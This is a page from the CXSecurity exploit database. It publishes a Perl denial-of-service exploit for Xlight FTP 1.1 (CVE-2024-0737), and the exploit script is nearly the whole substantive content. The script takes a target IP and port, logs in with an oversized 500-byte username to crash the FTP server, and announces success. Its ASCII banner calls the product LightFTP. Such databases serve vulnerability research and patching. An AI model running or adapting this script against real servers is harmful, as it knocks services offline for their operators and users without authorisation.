---
title: Xlight FTP 1.1 Denial Of Service
url: https://cxsecurity.com/issue/WLB-2025070035
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-07-29
fetch_date: 2025-10-06T23:16:41.516038
---

# Xlight FTP 1.1 Denial Of Service

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Xlight FTP 1.1 Denial Of Service** **2025.07.28**  Credit:  **[Fernando Mengali](https://cxsecurity.com/author/Fernando%2BMengali/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-0737](https://cxsecurity.com/cveshow/CVE-2024-0737/ "Click to see CVE-2024-0737")**  CWE: **[CWE-404](https://cxsecurity.com/cwe/CWE-404 "CWE-404")** | |

# Exploit Title: Xlight FTP 1.1 - Denial Of Service (DOS)
# Google Dork: N/A
# Date: 22 July 2025
# Exploit Author: Fernando Mengali
# LinkedIn: https://www.linkedin.com/in/fernando-mengali/
# Vendor Homepage: https://www.xlightftpd.com
# Software Link: N/A
# Version: 1.1
# Tested on: Windows XP
# CVE: CVE-2024-0737
$sis="$^O";
if ($sis eq "windows"){
$cmd="cls";
} else {
$cmd="clear";
}
system("$cmd");
intro();
main();
print "[+] Exploiting... \n";
my $payload = "\x41"x500;
my $ftp = Net::FTP->new($ip, Debug => 0) or die "Não foi possível se conectar ao servidor: $@";
$ftp->login($payload,"anonymous") or die "[+] Possibly exploited!";
$ftp->quit;
print "[+] Done - Exploited success!!!!!\n\n";
sub intro {
print q {
,--,
\_ \_\_\_/ /\|
,;'( )\_\_, ) ~
// // '--;
' \ | ^
^ ^
[+] LightFTP 1.1 - Denial of Service (DoS)
[\*] Coded by Fernando Mengali
[@] e-mail: fernando.mengalli@gmail.com
}
}
sub main {
our ($ip, $port) = @ARGV;
unless (defined($ip) && defined($port)) {
print " \nUsage: $0 <ip> <port> \n";
exit(-1);
}
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070035)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top